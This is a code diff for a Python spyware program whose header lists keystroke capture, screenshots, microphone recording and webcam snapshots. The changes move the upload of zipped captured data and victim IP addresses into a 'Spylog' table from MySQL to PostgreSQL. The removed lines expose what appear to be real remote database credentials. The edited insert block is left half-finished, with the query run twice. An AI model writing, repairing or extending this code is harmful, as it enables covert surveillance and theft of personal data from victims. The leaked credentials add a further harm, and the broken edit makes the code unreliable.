@@ -22,7 +22,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
-import pymysql
+import psycopg2  # Changed from pymysql to psycopg2
 from datetime import datetime
 
 ################ Functions: Keystroke Capture, Screenshot Capture, Mic Recording, Webcam Snapshot, Email Sending ################
@@ -139,16 +139,20 @@ def zip_folder(folder_path, output_zip):
 def addlog(db_config, zip_file_path):
     try:
         print(f"Attempting to connect to database at {db_config['host']}...")
-        conn = pymysql.connect(**db_config)
+        conn = psycopg2.connect(**db_config)
         cursor = conn.cursor()
 
         with open(zip_file_path, 'rb') as file:
             binary_data = file.read()
         
         local_ip = socket.gethostbyname(socket.gethostname())
-        sql = "INSERT INTO Spylog(logdatetime, ipaddress, logdata) VALUES (%s, %s, %s)"
-        print(f"Executing SQL query to insert ZIP file into Spylog table...")
+        # Change this line:
+        sql = "INSERT INTO \"Spylog\"(\"LogDateTime\", \"IPAddress\", \"LogData\") VALUES (%s, %s, %s)"
         cursor.execute(sql, (datetime.now(), local_ip, binary_data))
+        
+        # To this (with microsecond precision):
+        sql = "INSERT INTO \"Spylog\"(\"LogDateTime\", \"IPAddress\", \"LogData\") VALUES (%s, %s, %s)"
+        cursor.execute(sql, (datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'), local_ip, binary_data))
 
         conn.commit()
         print(f"File '{zip_file_path}' inserted successfully into database.")
@@ -162,7 +166,7 @@ def addlog(db_config, zip_file_path):
 
 def main():
     # Create directories
-    logs_path = 'C:/Users/user/Desktop/Logs'
+    logs_path = 'C:/Users/user/Desktop/logs'
     temp_path = 'C:/Users/user/Desktop/temp'
     file_path = 'C:\\Users\\user\\Desktop\\Logs\\'
     pathlib.Path(logs_path).mkdir(parents=True, exist_ok=True)
@@ -257,10 +261,11 @@ def main():
 
     # Database configuration
     db_config = {
-        "host": "srv1113.hstgr.io",
-        "user": "u858168866_userlogs",
-        "password": "mQ#7Oz7qQVVa",
-        "database": "u858168866_logs"
+        "host": "localhost",
+        "user": "postgres",
+        "password": "1234",
+        "database": "spyware_logs",
+        "port": "5432"
     }
 
     # Upload the ZIP file to the database
@@ -293,3 +298,4 @@ if __name__ == '__main__':
     except Exception as ex:
         logging.exception(f'* Error Occurred: {ex} *')
         print(f"Error occurred, check spy_error_log.txt for details.")
+        
